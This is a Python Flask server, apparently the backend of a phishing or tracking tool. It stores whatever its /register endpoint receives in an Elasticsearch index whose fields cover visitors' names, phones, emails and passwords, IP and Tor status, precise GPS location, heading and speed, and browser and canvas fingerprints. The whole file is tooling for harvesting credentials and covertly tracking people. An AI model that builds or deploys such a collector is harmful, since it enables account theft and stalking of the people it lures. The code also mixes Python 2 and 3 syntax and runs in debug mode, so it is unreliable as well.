import os
import json
from datetime import datetime
from flask import Flask, send_file, request, send_from_directory, render_template
from elasticsearch_dsl import DocType, Date, Integer, Keyword, Text
from elasticsearch_dsl.connections import connections

app = Flask(__name__)

#'''

class Mark(DocType):
    nom = Text(analyzer='snowball')
    phone = Text(analyzer='snowball')
    mail = Text(analyzer='snowball')
    password = Text(analyzer='snowball')
    wtf_pubip = Text(analyzer='snowball')
    wtf_privip = Text(analyzer='snowball')
    wtf_loc = Text(analyzer='snowball')
    wtf_host = Text(analyzer='snowball')
    wtf_isp = Text(analyzer='snowball')
    wtf_tor = Text(analyzer='snowball')
    geo_status  = Text(analyzer='snowball')
    geo_lat = Text(analyzer='snowball')
    geo_lng = Text(analyzer='snowball')
    geo_alt = Text(analyzer='snowball')
    geo_acc = Text(analyzer='snowball')
    geo_alac = Text(analyzer='snowball')
    geo_head = Text(analyzer='snowball')
    geo_speed = Text(analyzer='snowball')
    cli_fng = Text(analyzer='snowball')
    cli_ua = Text(analyzer='snowball')
    cli_brw = Text(analyzer='snowball')
    cli_brwv = Text(analyzer='snowball')
    cli_os = Text(analyzer='snowball')
    cli_osv = Text(analyzer='snowball')
    cli_device = Text(analyzer='snowball')
    cli_dvctype = Text(analyzer='snowball')
    cli_dvcvend = Text(analyzer='snowball')
    cli_cpu = Text(analyzer='snowball')
    cli_screen = Text(analyzer='snowball')
    cli_plugin = Text(analyzer='snowball')
    cli_java = Text(analyzer='snowball')
    cli_flash = Text(analyzer='snowball')
    cli_silver = Text(analyzer='snowball')
    cli_timezone = Text(analyzer='snowball')
    cli_lang = Text(analyzer='snowball')
    cli_canvas = Text(analyzer='snowball')


    class Meta:
        index = 'lustig'

    def save(self, ** kwargs):
        t = datetime.now()
        self['@timestamp'] = t.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
        return super(Mark, self).save(** kwargs)


#'''

@app.route("/register", methods=['POST'])
def register():
    errors = []
    results = {}
    if request.method == "POST":
        try:
            info = request.get_json()
            print(info)

            # Define a default Elasticsearch client
            connections.create_connection(hosts=['elk'])

            # Create and save mark's info
            pigeon = Mark()
            for i in info:
                pigeon[i] = info[i]
            pigeon.save()
            return json.dumps({'success':True}), 200, {'ContentType':'application/json'}

        except:
            errors.append(
                "Unable to get ES. Please make sure it's up and try again."
            )
            print errors
            return json.dumps({'success':False}), 400, {'ContentType':'application/json'}

@app.route('/', defaults={'path': 'index.html'})
@app.route("/<path:path>", methods=['GET'])
def catch_all(path):
    return send_from_directory('static', path)





if __name__ == "__main__":
    Mark.init()
    app.run(host='0.0.0.0', debug=True, port=80)
